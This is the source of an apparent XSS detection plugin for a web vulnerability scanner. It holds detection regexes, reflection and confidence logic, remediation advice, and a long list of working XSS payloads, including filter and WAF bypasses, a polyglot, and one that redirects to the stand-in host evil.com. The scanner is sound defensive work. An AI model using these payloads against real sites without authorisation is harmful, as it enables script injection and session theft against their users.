"""
Cross-Site Scripting (XSS) detection plugin
"""

import re
from typing import List, Dict, Any
from html import unescape

from vulnmind.plugins.base import ParameterPlugin
from vulnmind.core.models import VulnType, SeverityLevel


class XSSPlugin(ParameterPlugin):
    """XSS vulnerability detection plugin"""
    
    def __init__(self):
        super().__init__()
        self.vuln_type = VulnType.XSS_REFLECTED
        self.severity = SeverityLevel.HIGH
        
        # XSS detection patterns
        self.xss_patterns = [
            # Script tags
            r"<script[^>]*>.*?</script>",
            r"<script[^>]*>",
            
            # Event handlers
            r"on\w+\s*=\s*[\"'][^\"']*[\"']",
            r"on\w+\s*=\s*[^\"'\s>]+",
            
            # JavaScript URLs
            r"javascript:\s*[^\"'\s>]+",
            
            # Data URLs with JavaScript
            r"data:\s*text/html[^>]*base64",
            
            # Common XSS vectors
            r"<img[^>]*src\s*=\s*[\"']?javascript:",
            r"<iframe[^>]*src\s*=\s*[\"']?javascript:",
            r"<embed[^>]*src\s*=\s*[\"']?javascript:",
            r"<object[^>]*data\s*=\s*[\"']?javascript:",
        ]
        
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE | re.DOTALL) 
                                 for pattern in self.xss_patterns]
    
    def get_payloads(self) -> List[str]:
        """Get XSS payloads"""
        return [
            # Basic script injection
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            
            # Event handlers
            "<img src=x onerror=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video src=x onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<div onmouseover=alert('XSS')>XSS</div>",
            
            # HTML5 event handlers
            "<body onload=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe onload=alert('XSS')>",
            
            # JavaScript URLs
            "javascript:alert('XSS')",
            "javascript:confirm('XSS')",
            "javascript:prompt('XSS')",
            
            # Data URLs
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            
            # SVG XSS
            "<svg><script>alert('XSS')</script></svg>",
            "<svg onload=alert('XSS')></svg>",
            "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
            
            # Math XSS
            "<math><mtext><script>alert('XSS')</script></mtext></math>",
            
            # XML namespaces
            "<div xmlns='http://www.w3.org/1999/xhtml'><script>alert('XSS')</script></div>",
            
            # Filter bypass techniques
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<SCript>alert('XSS')</SCript>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src='x' onerror='alert(&quot;XSS&quot;)'>",
            
            # CSS-based XSS
            "<style>@import'data:text/css,body{background:url(javascript:alert(1))}'</style>",
            "<link rel=stylesheet href='data:text/css,body{background:url(javascript:alert(1))}'>",
            
            # Template injection
            "{{constructor.constructor('alert(1)')()}}",
            "${alert('XSS')}",
            "#{alert('XSS')}",
            
            # Polyglot payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e",
            
            # Context breaking
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "</script><script>alert('XSS')</script>",
            "</title><script>alert('XSS')</script>",
            
            # Encoded payloads
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            
            # DOM-based XSS
            "<iframe src='javascript:parent.location=\"http://evil.com\"'>",
            "<form action='javascript:alert(1)'><input type=submit>",
            
            # Mobile-specific
            "<input type=tel onfocus=alert('XSS') autofocus>",
            "<input type=email onfocus=alert('XSS') autofocus>",
            
            # WAF bypass
            "<script>eval(atob('YWxlcnQoMSk='))</script>",  # alert(1) base64
            "<script>Function('alert(1)')()</script>",
            "<script>[].constructor.constructor('alert(1)')()</script>",
            
            # Length-based
            "<q/oncut=alert(1)>",
            "<q/oncut=open()>",
            "<embed src='javascript:alert(1)'>",
        ]
    
    def detect_vulnerability(self, response_text: str, payload: str) -> bool:
        """Detect XSS vulnerability"""
        # Decode HTML entities to catch encoded reflections
        decoded_response = unescape(response_text)
        
        # Check if payload is reflected in response
        if self._is_payload_reflected(decoded_response, payload):
            return True
        
        # Check for XSS patterns in response
        for pattern in self.compiled_patterns:
            if pattern.search(decoded_response):
                return True
        
        # Check for specific XSS indicators
        xss_indicators = [
            "alert(", "confirm(", "prompt(",
            "javascript:", "onerror=", "onload=",
            "onmouseover=", "onfocus=", "<script",
            "</script>", "<svg", "onstart=",
            "ontoggle=", "data:text/html"
        ]
        
        response_lower = decoded_response.lower()
        payload_lower = payload.lower()
        
        for indicator in xss_indicators:
            if indicator in payload_lower and indicator in response_lower:
                return True
        
        return False
    
    def _is_payload_reflected(self, response_text: str, payload: str) -> bool:
        """Check if XSS payload is reflected in response"""
        # Direct reflection
        if payload in response_text:
            return True
        
        # Check for partial reflection
        payload_parts = self._extract_xss_components(payload)
        for part in payload_parts:
            if part in response_text and len(part) > 3:
                return True
        
        # Check for encoded reflection
        import html
        encoded_payload = html.escape(payload)
        if encoded_payload in response_text:
            return True
        
        return False
    
    def _extract_xss_components(self, payload: str) -> List[str]:
        """Extract meaningful components from XSS payload"""
        components = []
        
        # Extract tag names
        tag_pattern = r"<(\w+)"
        tags = re.findall(tag_pattern, payload, re.IGNORECASE)
        components.extend(tags)
        
        # Extract event handlers
        event_pattern = r"on(\w+)\s*="
        events = re.findall(event_pattern, payload, re.IGNORECASE)
        components.extend(events)
        
        # Extract function calls
        func_pattern = r"(\w+)\s*\("
        functions = re.findall(func_pattern, payload)
        components.extend(functions)
        
        # Extract quoted strings
        string_pattern = r"['\"]([^'\"]{3,})['\"]"
        strings = re.findall(string_pattern, payload)
        components.extend(strings)
        
        return [comp for comp in components if len(comp) > 2]
    
    def calculate_confidence(self, response_text: str, payload: str) -> float:
        """Calculate confidence for XSS detection"""
        confidence = 0.3  # Base confidence
        
        decoded_response = unescape(response_text)
        
        # High confidence for direct script reflection
        if "<script" in payload.lower() and "<script" in decoded_response.lower():
            confidence += 0.5
        
        # High confidence for event handler reflection
        if "onerror=" in payload.lower() and "onerror=" in decoded_response.lower():
            confidence += 0.5
        
        # Medium confidence for partial reflection
        payload_components = self._extract_xss_components(payload)
        reflected_components = 0
        for component in payload_components:
            if component in decoded_response:
                reflected_components += 1
        
        if payload_components:
            reflection_ratio = reflected_components / len(payload_components)
            confidence += reflection_ratio * 0.3
        
        # Check if payload appears in dangerous contexts
        dangerous_contexts = [
            r"<script[^>]*>.*?" + re.escape(payload),
            r"on\w+\s*=\s*[\"']?.*?" + re.escape(payload),
            r"href\s*=\s*[\"']?javascript:.*?" + re.escape(payload)
        ]
        
        for context in dangerous_contexts:
            if re.search(context, decoded_response, re.IGNORECASE):
                confidence += 0.2
                break
        
        return min(confidence, 1.0)
    
    def get_description(self) -> str:
        """Get vulnerability description"""
        return (
            "Cross-Site Scripting (XSS) vulnerability allows attackers to inject "
            "malicious scripts into web pages viewed by other users. This can lead "
            "to session hijacking, defacement, or malware distribution."
        )
    
    def get_remediation(self) -> str:
        """Get remediation advice"""
        return (
            "Implement proper input validation and output encoding. Use Content "
            "Security Policy (CSP) to restrict script execution. Sanitize all "
            "user input before displaying it. Use framework-provided XSS protection "
            "mechanisms. Validate input on both client and server side."
        )
    
    def get_cwe_id(self) -> int:
        """Get CWE ID for XSS"""
        return 79
    
    def get_references(self) -> List[str]:
        """Get reference URLs"""
        return [
            "https://owasp.org/www-community/attacks/xss/",
            "https://cwe.mitre.org/data/definitions/79.html",
            "https://portswigger.net/web-security/cross-site-scripting"
        ]
